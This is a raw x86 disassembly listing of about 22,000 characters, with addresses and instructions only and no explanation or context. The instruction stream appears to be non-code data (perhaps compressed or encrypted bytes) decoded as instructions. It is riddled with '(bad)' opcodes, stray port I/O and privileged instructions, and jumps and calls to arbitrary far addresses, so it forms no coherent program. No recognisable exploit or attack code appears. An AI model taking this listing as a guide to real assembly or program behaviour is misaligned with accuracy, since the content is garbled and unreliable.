  42f676:	mov    BYTE PTR [ebx],dl
  42f678:	jo     0x42f620
  42f67a:	pop    ebp
  42f67b:	repnz inc edi
  42f67d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f67e:	sub    eax,0x7cf22148
  42f683:	retf   
  42f684:	jg     0x42f6e2
  42f686:	ins    DWORD PTR es:[edi],dx
  42f687:	or     eax,0xeadb9be0
  42f68c:	mov    al,ds:0x5534debb
  42f691:	test   al,0xcb
  42f693:	push   edx
  42f694:	xchg   ebx,eax
  42f695:	dec    edx
  42f696:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f697:	or     eax,0x9b20b9d1
  42f69c:	or     bh,BYTE PTR [edx+0x61]
  42f69f:	sub    edi,DWORD PTR [edi]
  42f6a1:	dec    ecx
  42f6a2:	mov    BYTE PTR [ebx+0x565de232],0xa
  42f6a9:	mov    ecx,ebp
  42f6ab:	pop    eax
  42f6ac:	push   ecx
  42f6ad:	clc    
  42f6ae:	lahf   
  42f6af:	lock leave 
  42f6b1:	icebp  
  42f6b2:	loopne 0x42f675
  42f6b4:	push   ss
  42f6b5:	or     al,BYTE PTR [ecx]
  42f6b7:	push   edi
  42f6b8:	lods   al,BYTE PTR ds:[esi]
  42f6b9:	push   eax
  42f6ba:	ins    DWORD PTR es:[edi],dx
  42f6bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f6bc:	(bad)  
  42f6bd:	imul   ecx,DWORD PTR [edi-0x312b5f7],0x4aa9ef9d
  42f6c7:	lods   al,BYTE PTR ds:[esi]
  42f6c8:	test   al,0x88
  42f6ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f6cb:	mov    ch,0xd6
  42f6cd:	rcr    DWORD PTR [eax-0x6be7b5bb],cl
  42f6d3:	or     edi,esp
  42f6d5:	pushf  
  42f6d6:	inc    edi
  42f6d7:	imul   ebx,DWORD PTR [edx+0x3c],0x55bc30ae
  42f6de:	sbb    eax,0x2e8077b3
  42f6e3:	scas   al,BYTE PTR es:[edi]
  42f6e4:	jp     0x42f765
  42f6e6:	push   ebp
  42f6e7:	shr    esp,0xbb
  42f6ea:	clc    
  42f6eb:	cmc    
  42f6ec:	mov    ds,WORD PTR [ebx]
  42f6ee:	pushf  
  42f6ef:	loopne 0x42f75a
  42f6f1:	test   eax,0x9627c781
  42f6f6:	jne    0x42f71a
  42f6f8:	cmp    DWORD PTR [edx],edx
  42f6fa:	in     eax,dx
  42f6fb:	es retf 
  42f6fd:	jno    0x42f6ed
  42f6ff:	call   0xf772dbcd
  42f704:	inc    ebx
  42f705:	dec    edi
  42f706:	fisttp WORD PTR [edi-0x7134c02a]
  42f70c:	pop    es
  42f70d:	into   
  42f70e:	sub    ch,BYTE PTR [ecx+0x70]
  42f711:	pop    esi
  42f712:	out    0xe4,al
  42f714:	sbb    eax,0x845eaf6e
  42f719:	nop
  42f71a:	push   eax
  42f71b:	pop    esp
  42f71c:	mov    ds:0x9b4e468a,eax
  42f721:	jnp    0x42f6ea
  42f723:	jnp    0x42f73e
  42f725:	(bad)  
  42f726:	jg     0x42f6d9
  42f728:	test   BYTE PTR [edi],cl
  42f72a:	pop    esp
  42f72b:	jne    0x42f7a4
  42f72d:	test   BYTE PTR [edi],dl
  42f72f:	mov    bh,0x71
  42f731:	sbb    al,0x6f
  42f733:	pop    ebx
  42f734:	xchg   ecx,eax
	...
  42f795:	add    BYTE PTR [ecx-0x5f],dh
  42f798:	(bad)  
  42f799:	test   al,0xd6
  42f79b:	(bad)  
  42f79c:	jg     0x42f797
  42f79e:	in     al,0x8a
  42f7a0:	jmp    0x42f76f
  42f7a2:	add    al,BYTE PTR [ebp-0x308d6be]
  42f7a8:	add    DWORD PTR [eax],eax
  42f7aa:	pop    es
  42f7ab:	add    DWORD PTR [eax],eax
  42f7ad:	add    BYTE PTR [ebp+0x173ea0f3],ah
  42f7b3:	outs   dx,DWORD PTR ds:[esi]
  42f7b4:	or     DWORD PTR [eax-0x27],esi
  42f7b7:	fwait
  42f7b8:	jp     0x42f7c0
  42f7ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f7bb:	mov    eax,0xa697de3e
  42f7c0:	push   edi
  42f7c1:	cwde   
  42f7c2:	aam    0x88
  42f7c4:	loope  0x42f792
  42f7c6:	jb     0x42f74d
  42f7c8:	shl    BYTE PTR [eax+esi*8],cl
  42f7cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f7cc:	push   edi
  42f7cd:	pop    ebp
  42f7ce:	mov    ?,WORD PTR [edx+0x2cff5471]
  42f7d4:	shl    DWORD PTR [ebx],0x46
  42f7d7:	cmp    DWORD PTR [ebx+edx*2+0x23],edx
  42f7db:	dec    esi
  42f7dc:	mov    DWORD PTR [esi],esi
  42f7de:	das    
  42f7df:	popf   
  42f7e0:	dec    ecx
  42f7e1:	jne    0x42f7a3
  42f7e3:	dec    ecx
  42f7e4:	mov    eax,ds:0x816bf406
  42f7e9:	mov    cl,0xed
  42f7eb:	pop    DWORD PTR [eax-0x4ade8a33]
  42f7f1:	fs or  edi,ebx
  42f7f4:	adc    ebp,ecx
  42f7f6:	std    
  42f7f7:	pop    edi
  42f7f8:	cmp    BYTE PTR [eax-0x19a12f51],cl
  42f7fe:	test   DWORD PTR [ebx+0x5a],esi
  42f801:	call   0x9142:0x113e5f92
  42f808:	xor    eax,0xe84ed598
  42f80d:	jmp    0xeb716272
  42f812:	retf   
  42f813:	pushf  
  42f814:	mov    al,ds:0x26471709
  42f819:	sbb    bh,BYTE PTR [esi-0x5e]
  42f81c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f81d:	and    BYTE PTR [edx+ecx*2-0x38],ch
  42f821:	push   ss
  42f822:	shl    edi,1
  42f824:	(bad)  
  42f825:	xchg   esi,eax
  42f826:	repz call 0xeec4a99e
  42f82c:	xchg   esi,eax
  42f82d:	xchg   edx,eax
  42f82e:	es jge 0x42f7c1
  42f831:	scas   al,BYTE PTR es:[edi]
  42f832:	shl    BYTE PTR [edi-0x61],1
  42f835:	fnstenv [eax-0x33087459]
  42f83b:	jmp    0x99f:0x1fd5b705
  42f842:	or     BYTE PTR [ecx],al
  42f844:	pusha  
  42f845:	xchg   edi,ecx
  42f847:	mov    ?,esi
  42f849:	adc    al,0x79
  42f84b:	and    eax,0xd10e5d4f
  42f850:	add    al,0x26
  42f852:	ja     0x42f884
  42f854:	sub    DWORD PTR [ebx+0x48],esi
  42f857:	sbb    eax,0x8bc15be
  42f85c:	cmp    BYTE PTR [ebp+0x726e4b81],bh
  42f862:	das    
  42f863:	retf   0x8f6f
  42f866:	add    al,0x24
  42f868:	mov    al,BYTE PTR [ebx+0x26]
  42f86b:	pop    eax
  42f86c:	mov    eax,0x90c3933b
  42f871:	sbb    BYTE PTR [edi],bl
  42f873:	inc    ebp
  42f874:	xor    al,0x83
  42f876:	inc    ebx
  42f877:	clc    
  42f878:	pop    edx
  42f879:	add    BYTE PTR [ecx-0x66f8b680],ah
  42f87f:	mov    al,0x26
  42f881:	inc    esp
  42f882:	xchg   esi,eax
  42f883:	test   al,0x47
  42f885:	cmp    BYTE PTR [ecx],0x19
  42f888:	gs push es
  42f88a:	jle    0x42f824
  42f88c:	sti    
  42f88d:	(bad)  
  42f88e:	fimul  DWORD PTR [eax-0x75]
  42f891:	sbb    ecx,DWORD PTR ds:0xfca7072f
  42f897:	push   ss
  42f898:	and    DWORD PTR [ebx+0x51],edi
  42f89b:	jmp    0x42f858
  42f89d:	xchg   edi,eax
  42f89e:	mov    DWORD PTR [edx],eax
  42f8a0:	add    DWORD PTR [ebx],0x7892430b
  42f8a6:	jae    0x42f8a1
  42f8a8:	mov    al,bh
  42f8aa:	cmc    
  42f8ab:	lods   eax,DWORD PTR ds:[esi]
  42f8ac:	dec    ecx
  42f8ad:	sub    BYTE PTR [edx-0x10],al
  42f8b0:	jmp    0x42f8b6
  42f8b2:	and    bh,bh
  42f8b4:	aam    0x0
	...
  42f916:	adc    al,0x74
  42f918:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f919:	push   ebp
  42f91a:	in     al,0xd5
  42f91c:	cmc    
  42f91d:	jne    0x42f8e0
  42f91f:	ror    DWORD PTR [ecx+0x94949c],1
  42f925:	xlat   BYTE PTR ds:[ebx]
  42f926:	(bad)  
  42f927:	std    
  42f928:	add    DWORD PTR [eax],eax
  42f92a:	pop    es
  42f92b:	add    DWORD PTR [eax],eax
  42f92d:	add    ah,al
  42f92f:	loope  0x42f982
  42f931:	xchg   edi,eax
  42f932:	mov    dh,0x3
  42f934:	lds    eax,FWORD PTR [esi+ebp*1+0x49127aa9]
  42f93b:	aaa    
  42f93c:	mov    al,cl
  42f93e:	call   FWORD PTR [esi]
  42f940:	xchg   DWORD PTR [esi+0x4a],ecx
  42f943:	add    bh,al
  42f945:	pop    es
  42f946:	test   eax,0xbdb5dc26
  42f94b:	aam    0x7b
  42f94d:	adc    ch,BYTE PTR [esi+0x20e84e91]
  42f953:	(bad)  
  42f954:	rol    DWORD PTR [edx],cl
  42f956:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f957:	in     eax,dx
  42f958:	pop    ds
  42f959:	fld    QWORD PTR [edi-0x4f0c73ce]
  42f95f:	mov    ds:0xf008ba1c,al
  42f964:	jno    0x42f990
  42f966:	pushf  
  42f967:	js     0x42f93c
  42f969:	sar    dh,cl
  42f96b:	jp     0x42f978
  42f96d:	dec    edx
  42f96e:	lods   eax,DWORD PTR fs:[esi]
  42f970:	xor    ecx,DWORD PTR [esi]
  42f972:	xchg   edi,eax
  42f973:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f974:	sbb    eax,0xe0452f5e
  42f979:	leave  
  42f97a:	nop
  42f97b:	dec    esi
  42f97c:	in     al,0x81
  42f97e:	sub    ebp,ebp
  42f980:	bound  eax,QWORD PTR [ecx]
  42f982:	adc    ebp,eax
  42f984:	cmp    esi,esi
  42f986:	scas   al,BYTE PTR es:[edi]
  42f987:	je     0x42f925
  42f989:	fs pop es
  42f98b:	xchg   esi,eax
  42f98c:	mov    al,dl
  42f98e:	xlat   BYTE PTR ds:[ebx]
  42f98f:	cdq    
  42f990:	cmp    edi,DWORD PTR [eax]
  42f992:	fisub  DWORD PTR [ebx-0x6e]
  42f995:	add    DWORD PTR [esi+0x4eb2b51f],ebp
  42f99b:	mov    dh,0x98
  42f99d:	mov    ch,0x74
  42f99f:	bound  eax,QWORD PTR [ecx-0x31bf9a25]
  42f9a5:	adc    DWORD PTR [eax+0x35b2afbc],0xffffffef
  42f9ac:	push   ebp
  42f9ad:	stc    
  42f9ae:	nop
  42f9af:	lar    ebx,WORD PTR [eax-0x7a]
  42f9b3:	enter  0xd0,0x90
  42f9b7:	xchg   ah,ch
  42f9b9:	outs   dx,BYTE PTR ds:[esi]
  42f9ba:	pop    ecx
  42f9bb:	inc    esi
  42f9bc:	dec    edi
  42f9bd:	dec    esi
  42f9be:	in     eax,dx
  42f9bf:	sub    DWORD PTR [esi+0x5f],ebp
  42f9c2:	adc    BYTE PTR [eax+0x2a],dl
  42f9c5:	push   ebx
  42f9c6:	mov    esi,0xc74cc7fc
  42f9cb:	sbb    DWORD PTR [ecx],0xcde803a0
  42f9d1:	in     eax,dx
  42f9d2:	push   ebp
  42f9d3:	mov    ah,0x52
  42f9d5:	mov    esi,edx
  42f9d7:	mov    al,ds:0x93ed5da0
  42f9dc:	leave  
  42f9dd:	in     al,dx
  42f9de:	es sub esp,ebp
  42f9e1:	mov    cl,0xe2
  42f9e3:	sti    
  42f9e4:	sub    bl,BYTE PTR [edx]
  42f9e6:	pop    ebx
  42f9e7:	or     edi,DWORD PTR [edi]
  42f9e9:	out    0x8e,eax
  42f9eb:	xor    dh,BYTE PTR [esi]
  42f9ed:	test   al,0x89
  42f9ef:	add    BYTE PTR [ebp+0xae2b225],dl
  42f9f5:	ins    DWORD PTR es:[edi],dx
  42f9f6:	add    al,0xe3
  42f9f8:	imul   edx,DWORD PTR [edi+0x1ce6b45],0x15
  42f9ff:	mov    ebx,0x5d3f8a1f
  42fa04:	mov    eax,0xa5964759
  42fa09:	ja     0x42fa62
  42fa0b:	test   eax,0x53fe8c1d
  42fa10:	inc    ebx
  42fa11:	add    bh,BYTE PTR [edi-0x19efe911]
  42fa17:	xor    eax,0xd5b251a8
  42fa1c:	(bad)  
  42fa1e:	in     al,dx
  42fa1f:	or     ecx,edi
  42fa21:	out    0x34,al
  42fa23:	mov    eax,ds:0xb3e05a0c
  42fa29:	test   DWORD PTR [eax+ebx*8-0x67ebef],0x9d07cadf
  42fa34:	icebp  
	...
  42fa95:	add    BYTE PTR [ebx],bl
  42fa97:	out    dx,eax
  42fa98:	shl    BYTE PTR [esi],0xf4
  42fa9b:	aas    
  42fa9c:	(bad)  
  42fa9d:	out    dx,eax
  42fa9e:	sbb    dl,BYTE PTR [esi+eiz*8-0x1c]
  42faa2:	ins    BYTE PTR es:[edi],dx
  42faa3:	dec    edx
  42faa4:	scas   eax,DWORD PTR es:[edi]
  42faa5:	scas   eax,DWORD PTR es:[edi]
  42faa6:	add    eax,0x70001ff
  42faab:	add    DWORD PTR [eax],eax
  42faad:	add    BYTE PTR [ebx+0x5b],bl
  42fab0:	loop   0x42fa50
  42fab2:	test   edx,ecx
  42fab4:	mov    ebp,0xa69fb0ec
  42fab9:	iret   
  42faba:	pop    esp
  42fabb:	sbb    dh,ah
  42fabd:	sbb    BYTE PTR [ebp+0x4d],0x88
  42fac1:	push   0xa2ccabae
  42fac6:	cld    
  42fac7:	std    
  42fac8:	outs   dx,DWORD PTR ds:[esi]
  42fac9:	lds    ebx,FWORD PTR [ebx]
  42facb:	mov    gs,WORD PTR [ecx-0x1f5c494c]
  42fad1:	repnz out dx,al
  42fad3:	or     DWORD PTR [edx],eax
  42fad5:	std    
  42fad6:	cmp    DWORD PTR [esi+0x76ab4c1f],esi
  42fadc:	lods   al,BYTE PTR ds:[esi]
  42fadd:	dec    eax
  42fadf:	mov    ebx,0xd726dc5f
  42fae4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42fae5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42fae6:	or     BYTE PTR [eax+0x2f],dl
  42fae9:	bound  ecx,QWORD PTR [ecx-0x228007c]
  42faef:	repz test BYTE PTR [ebp+0x41983415],dl
  42faf6:	dec    ebp
  42faf7:	push   es
  42faf8:	(bad)  [edx+0x4f97c181]
  42fafe:	jmp    0x42fb3a
  42fb00:	pop    ds
  42fb01:	das    
  42fb02:	rcr    esp,0x95
  42fb05:	pop    edx
  42fb06:	dec    esi
  42fb07:	and    dl,ch
  42fb09:	ficomp WORD PTR [edi-0x4805bc70]
  42fb0f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42fb10:	and    ch,0xb7
  42fb13:	pop    ds
  42fb14:	or     esp,DWORD PTR [eax+0x6482b5ba]
  42fb1a:	aaa    
  42fb1b:	pop    ebp
  42fb1c:	dec    eax
  42fb1d:	test   al,0xc7
  42fb1f:	mov    DWORD PTR [eax+0x5a6faa0a],edx
  42fb25:	lahf   
  42fb26:	push   cs
  42fb27:	in     al,dx
  42fb28:	ret    
  42fb29:	outs   dx,DWORD PTR ds:[si]
  42fb2b:	xor    BYTE PTR [ebp+0x2ed1dbf8],0x8d
  42fb32:	(bad)  
  42fb33:	sbb    BYTE PTR [edx-0x17],cl
  42fb36:	adc    dh,dl
  42fb38:	outs   dx,BYTE PTR ds:[esi]
  42fb39:	sbb    DWORD PTR [ecx],edx
  42fb3b:	(bad)  
  42fb3c:	imul   esi,edi,0xffffff90
  42fb3f:	sbb    edi,DWORD PTR [edx+esi*8-0x42be4ad6]
  42fb46:	fdiv   QWORD PTR [ecx+0x3bb010bb]
  42fb4c:	pusha  
  42fb4d:	ror    BYTE PTR [ebp-0x7d],cl
  42fb50:	push   ebx
  42fb51:	in     eax,dx
  42fb52:	js     0x42fbc9
  42fb54:	test   eax,0x761cd50f
  42fb59:	inc    ebx
  42fb5a:	mov    ch,dh
  42fb5c:	test   DWORD PTR [edi],esp
  42fb5e:	(bad)  
  42fb5f:	xor    ecx,DWORD PTR [esi+0x10714712]
  42fb65:	ins    DWORD PTR es:[edi],dx
  42fb66:	std    
  42fb67:	and    eax,0xc7228a24
  42fb6c:	arpl   WORD PTR [eax-0x19],si
  42fb6f:	jg     0x42fbcf
  42fb71:	rcr    BYTE PTR [edi+0x32bd7c7b],cl
  42fb77:	or     edx,DWORD PTR [esi+0x481aabdd]
  42fb7d:	pop    ecx
  42fb7e:	cli    
  42fb7f:	aas    
  42fb80:	lock lock add al,0x6
  42fb84:	inc    edi
  42fb85:	cld    
  42fb86:	mov    DWORD PTR [edx-0x665da746],esp
  42fb8c:	dec    esi
  42fb8d:	imul   ebp,DWORD PTR [edi],0xde5f2c4a
  42fb93:	(bad)  
  42fb94:	push   ecx
  42fb95:	mov    ebx,0xaf8186e6
  42fb9a:	int    0xdf
  42fb9c:	mov    ds:0x57489fd9,eax
  42fba1:	mov    ah,0x36
  42fba3:	inc    edi
  42fba4:	ins    DWORD PTR es:[edi],dx
  42fba5:	sub    al,0xc9
  42fba7:	adc    cl,BYTE PTR [edi]
  42fba9:	adc    eax,0xc316b59a
  42fbae:	int    0x11
  42fbb0:	jnp    0x42fb5c
  42fbb2:	xchg   esi,eax
  42fbb3:	jmp    0x0:0x1d
	...
  42fc16:	or     ecx,DWORD PTR [eax+0x3ba319a3]
  42fc1c:	mov    ebx,0x5607ea9a
  42fc21:	sahf   
  42fc22:	aas    
  42fc23:	out    dx,eax
  42fc24:	sub    ebp,DWORD PTR [esp+ecx*1]
  42fc27:	add    BYTE PTR [edx],al
  42fc29:	add    BYTE PTR [edi],al
  42fc2b:	add    DWORD PTR [eax],eax
  42fc2d:	add    BYTE PTR [esi+ebx*1-0x45a4c314],al
  42fc34:	pop    es
  42fc35:	fxch   st(1)
  42fc37:	inc    edx
  42fc38:	push   ss
  42fc39:	(bad)  
  42fc3a:	(bad)  
  42fc3b:	ficom  WORD PTR [ebp+0x81a0b26]
  42fc41:	mov    eax,ds:0xf9c71952
  42fc46:	ficom  DWORD PTR [edi+0x74b471ac]
  42fc4c:	(bad)  
  42fc4d:	sbb    DWORD PTR ds:0xbd3d6289,ebp
  42fc53:	xor    eax,0x9e3484f9
  42fc58:	sar    DWORD PTR [edi-0x58],cl
  42fc5b:	mov    ah,0xb3
  42fc5d:	jmp    0x42fc7b
  42fc5f:	shl    ecx,1
  42fc61:	xor    BYTE PTR ds:0x1f8fd425,ch
  42fc67:	iret   
  42fc68:	adc    ebp,DWORD PTR [eax]
  42fc6a:	mov    dl,0x47
  42fc6c:	or     DWORD PTR [ecx+edx*1+0x4],0x1
  42fc71:	push   eax
  42fc72:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42fc73:	fst    st(4)
  42fc75:	dec    esi
  42fc76:	push   ebp
  42fc77:	sbb    ecx,DWORD PTR [ecx]
  42fc79:	adc    edi,ebp
  42fc7b:	sahf   
  42fc7c:	int    0xdb
  42fc7e:	cmp    cl,ch
  42fc80:	adc    eax,0xac7748d
  42fc85:	shr    DWORD PTR fs:[eax-0x23],0xc7
  42fc8a:	or     al,0x6d
  42fc8c:	clc    
  42fc8d:	stc    
  42fc8e:	test   eax,0xcd8d61eb
  42fc93:	mov    cl,0x50
  42fc95:	mov    BYTE PTR [ebp+0x2adb8d1c],0x46
  42fc9c:	mov    ebp,DWORD PTR [ebx]
  42fc9e:	clc    
  42fc9f:	xor    ebp,edi
  42fca1:	cli    
  42fca2:	or     edi,DWORD PTR [edi]
  42fca4:	rcr    BYTE PTR [ebx],cl
  42fca6:	stc    
  42fca7:	push   0x9cf36345
  42fcac:	mov    ss,ebx
  42fcae:	es into 
  42fcb0:	imul   eax,DWORD PTR ds:0xd0866618,0x4
  42fcb7:	sub    BYTE PTR [edx],cl
  42fcb9:	dec    esp
  42fcba:	lds    si,DWORD PTR [eax+0x32]
  42fcbe:	mov    esp,0x541a2ea7
  42fcc3:	mov    edi,DWORD PTR [esi+edx*4+0x45]
  42fcc7:	mov    eax,0xeeb402fb
  42fccc:	mov    ah,0xf3
  42fcce:	cmp    ebp,DWORD PTR [edi-0x4a]
  42fcd1:	out    0x2,eax
  42fcd3:	fcomp  st(5)
  42fcd5:	or     al,0xbb
  42fcd7:	add    BYTE PTR [ebx-0x1b8631e2],0x5
  42fcde:	ins    BYTE PTR es:[edi],dx
  42fcdf:	arpl   WORD PTR [edx+0x2d6db447],dx
  42fce5:	push   cs
  42fce6:	fwait
  42fce7:	jmp    0xac5f3cde
  42fcec:	gs inc edi
  42fcee:	xor    eax,0x56b976f1
  42fcf3:	iret   
  42fcf4:	leave  
  42fcf5:	jp     0x42fd12
  42fcf7:	and    bl,BYTE PTR [edx]
  42fcf9:	push   ds
  42fcfa:	dec    ebp
  42fcfb:	xchg   edx,eax
  42fcfc:	jl     0x42fcfe
  42fcfe:	(bad)  
  42fcff:	pusha  
  42fd00:	imul   ecx
  42fd02:	sbb    dh,al
  42fd04:	xor    esi,DWORD PTR [ebp-0x128b4484]
  42fd0a:	loopne 0x42fd0e
  42fd0c:	add    ah,BYTE PTR [eax]
  42fd0e:	in     al,0xec
  42fd10:	out    dx,al
  42fd11:	outs   dx,DWORD PTR ds:[esi]
  42fd12:	inc    esp
  42fd13:	ficom  WORD PTR [edx-0x4a]
  42fd16:	jmp    0x42fce6
  42fd18:	out    dx,eax
  42fd19:	daa    
  42fd1a:	popa   
  42fd1b:	pusha  
  42fd1c:	cld    
  42fd1d:	xor    al,0x20
  42fd1f:	in     al,dx
  42fd20:	sar    BYTE PTR [ebx+eiz*4-0x49],cl
  42fd24:	aaa    
  42fd25:	clc    
  42fd26:	out    0x7a,eax
  42fd28:	and    DWORD PTR [eax-0x23d8887b],edx
  42fd2e:	adc    al,0x20
  42fd30:	adc    DWORD PTR [esi-0x31],edi
  42fd33:	cmp    DWORD PTR ds:0x0,0x0
	...
  42fd95:	add    BYTE PTR [eax-0x40],cl
  42fd98:	ret    0xcaf0
  42fd9b:	bnd jp 0x42fd96
  42fd9e:	int3   
  42fd9f:	jae    0x42fda8
  42fda1:	adc    al,0x31
  42fda3:	dec    ebp
  42fda4:	push   0x2011325
  42fda9:	add    BYTE PTR [edi],al
  42fdab:	add    DWORD PTR [eax],eax
  42fdad:	add    BYTE PTR [ecx-0x34],al
  42fdb0:	imul   esp,DWORD PTR [ecx+0x4d],0x43
  42fdb4:	xor    BYTE PTR [eax-0x15],ch
  42fdb7:	xor    DWORD PTR [edi-0x27],edi
  42fdba:	enter  0x5af6,0xbc
  42fdbe:	arpl   WORD PTR [edi+edi*2-0xe953468],bp
  42fdc5:	in     al,0x4b
  42fdc7:	in     al,dx
  42fdc8:	inc    esp
  42fdc9:	mov    al,ds:0x8cda2b4c
  42fdce:	mov    esp,0x817eaee1
  42fdd3:	add    eax,0xf89bea1a
  42fdd8:	pop    edx
  42fdd9:	icebp  
  42fdda:	into   
  42fddb:	addr16 push ebp
  42fddd:	mov    ds:0xb53a9cf,al
  42fde2:	(bad)  [edi+0x2e]
  42fde5:	test   DWORD PTR [eax],edi
  42fde7:	fisub  DWORD PTR [ebx+0x1421a2cc]
  42fded:	xchg   DWORD PTR [ebp+ecx*4-0x19],ecx
  42fdf1:	out    0x64,al
  42fdf3:	lods   al,BYTE PTR ds:[esi]
  42fdf4:	mov    bh,0x33
  42fdf6:	push   ebx
  42fdf7:	push   eax
  42fdf8:	ret    
  42fdf9:	mov    DWORD PTR [eax],edi
  42fdfb:	ss add cl,ch
  42fdfe:	std    
  42fdff:	add    DWORD PTR [esi],edi
  42fe01:	mov    WORD PTR [edx],fs
  42fe03:	push   0xffffffef
  42fe05:	inc    esi
  42fe06:	popf   
  42fe07:	and    al,0x86
  42fe09:	mov    al,0x42
  42fe0b:	pushf  
  42fe0c:	jmp    0x42fe62
  42fe0e:	and    cl,bh
  42fe10:	push   ss
  42fe11:	das    
  42fe12:	inc    ebp
  42fe13:	sbb    esp,DWORD PTR [esi+0x51]
  42fe16:	call   0xb447:0xbfb98340
  42fe1d:	in     al,0x3e
  42fe1f:	mov    edx,0x79b347fd
  42fe24:	push   edi
  42fe25:	inc    edx
  42fe26:	push   ecx
  42fe27:	mov    ds:0xd8b90abb,eax
  42fe2c:	mov    eax,ds:0xb3bf8024
  42fe31:	scas   al,BYTE PTR es:[edi]
  42fe32:	test   BYTE PTR [ebp-0x25],ah
  42fe35:	ins    DWORD PTR es:[edi],dx
  42fe36:	add    ch,BYTE PTR [ebx+0x6b1bac6a]
  42fe3c:	scas   eax,DWORD PTR es:[edi]
  42fe3d:	jle    0x42fde5
  42fe3f:	sub    ebx,DWORD PTR [edi+0x1c5edf23]
  42fe45:	ins    BYTE PTR es:[edi],dx
  42fe46:	ficom  WORD PTR [eax]
  42fe48:	xchg   ebx,eax
  42fe49:	int    0x3b
  42fe4b:	add    BYTE PTR ds:0x9c6f6221,0xb
  42fe52:	adc    cl,ch
  42fe54:	push   edi
  42fe55:	xchg   edx,eax
  42fe56:	xor    BYTE PTR ds:0x46103ea,cl
  42fe5c:	shl    eax,0xd2
  42fe5f:	out    dx,eax
  42fe60:	lock dec ebp
  42fe62:	mov    eax,ds:0xb1ebbb74
  42fe67:	adc    ebp,DWORD PTR [edx+0x40f48e75]
  42fe6d:	jp     0x42fe50
  42fe6f:	and    BYTE PTR [eax],0xef
  42fe72:	daa    
  42fe73:	pushf  
  42fe74:	mov    eax,0xe8a5117b
  42fe79:	sbb    DWORD PTR [ebx+0x415f9d44],ebx
  42fe7f:	cli    
  42fe80:	ins    DWORD PTR es:[edi],dx
  42fe81:	mov    ds:0x38239f85,eax
  42fe86:	jecxz  0x42feaa
  42fe88:	push   ebp
  42fe89:	add    BYTE PTR [esi+0x70],0x1b
  42fe8d:	cmp    al,al
  42fe8f:	push   0xffffffe8
  42fe91:	cmp    bh,dh
  42fe93:	fs clc 
  42fe95:	ss out dx,eax
  42fe97:	aam    0xae
  42fe99:	and    ah,bh
  42fe9b:	xor    DWORD PTR [esp+ecx*4-0x52],0xee0c9044
  42fea3:	or     esp,ebx
  42fea5:	shr    edi,cl
  42fea7:	inc    esi
  42fea8:	xor    DWORD PTR [ebx],ebp
  42feaa:	jo     0x42fe4b
  42feac:	adc    eax,0xf014d7f1
  42feb1:	adc    BYTE PTR [edi+0x78be],dl
	...
  42ff13:	add    BYTE PTR [eax],al
  42ff15:	add    BYTE PTR [edi+eiz*2],al
  42ff18:	std    
  42ff19:	aaa    
  42ff1a:	(bad)  
  42ff1b:	mov    edi,0x2c6b77ce
  42ff20:	mov    WORD PTR [ecx],es
  42ff22:	(bad)  
  42ff23:	cmp    bl,BYTE PTR [edi+ebp*1+0x2021a]
  42ff2a:	mov    DWORD PTR [eax],eax
  42ff2c:	add    BYTE PTR [eax],al
  42ff2e:	mov    cl,0x24
  42ff30:	nop
  42ff31:	cmp    al,0xdc
  42ff33:	push   edx
  42ff34:	imul   ecx,DWORD PTR [ecx-0x52ca4cd2],0xa0b364a0
  42ff3e:	bound  edx,QWORD PTR [esi+0x24a03cec]
  42ff44:	mov    esp,0x6aa59243
  42ff49:	shr    BYTE PTR [ebx-0x61],0xa9
  42ff4d:	add    BYTE PTR [edx],al
  42ff4f:	adc    edi,ebx
  42ff51:	rcr    DWORD PTR [ecx-0x742e5101],cl
  42ff57:	test   al,0x17
  42ff59:	ret    0x848
  42ff5c:	(bad)  
  42ff5d:	xor    al,0xb4
  42ff5f:	sub    al,0x92
  42ff61:	leave  
  42ff62:	in     al,dx
  42ff63:	pop    es
  42ff64:	sub    ebx,DWORD PTR [esi]
  42ff66:	rol    BYTE PTR [esi+0x55c4811a],0x9e
  42ff6d:	shl    DWORD PTR [ebx],0xd0
  42ff70:	xlat   BYTE PTR ds:[ebx]
  42ff71:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ff72:	mov    ebx,0xf63f7fab
  42ff77:	jns    0x42ff88
  42ff79:	jne    0x42ffc9
  42ff7b:	xlat   BYTE PTR ds:[ebx]
  42ff7c:	scas   eax,DWORD PTR es:[edi]
  42ff7d:	repz (bad) 
  42ff80:	pop    ecx
  42ff81:	cwde   
  42ff82:	push   0x50e97f66
  42ff87:	xor    eax,0xebb68aed
  42ff8c:	aad    0x2f
  42ff8e:	mov    bl,0xa8
  42ff90:	into   
  42ff91:	jl     0x42ff5a
  42ff93:	dec    esi
  42ff94:	sahf   
  42ff95:	inc    esi
  42ff96:	sbb    DWORD PTR [edx],ebx
  42ff98:	cld    
  42ff99:	mov    ecx,DWORD PTR [ebx]
  42ff9b:	sti    
  42ff9c:	jg     0x42ff72
  42ff9e:	mov    ds:0xcb0af068,al
  42ffa3:	push   ss
  42ffa4:	fwait
  42ffa5:	les    ebp,FWORD PTR [ebx]
  42ffa7:	jmp    0xb632:0xc760ffcd
  42ffae:	test   BYTE PTR [ecx],cl
  42ffb0:	popa   
  42ffb1:	(bad)  
  42ffb2:	pop    eax
  42ffb3:	iret   
  42ffb4:	dec    ebx
  42ffb5:	mov    ch,0x2
	...
  430013:	add    BYTE PTR [eax],al
  430015:	add    BYTE PTR [ebp+0x55],cl
  430018:	mov    DWORD PTR [ebx-0x7e9f13f8],ecx
  43001e:	mov    esp,ebp
  430020:	or     al,ah
  430022:	dec    ebp
  430023:	add    bh,al
  430025:	add    BYTE PTR [eax],cl
  430027:	add    BYTE PTR [eax],al
  430029:	mov    DWORD PTR [eax],0x3ef44545
  43002f:	xor    eax,0x9c8b8500
  430034:	hlt    
  430035:	clc    
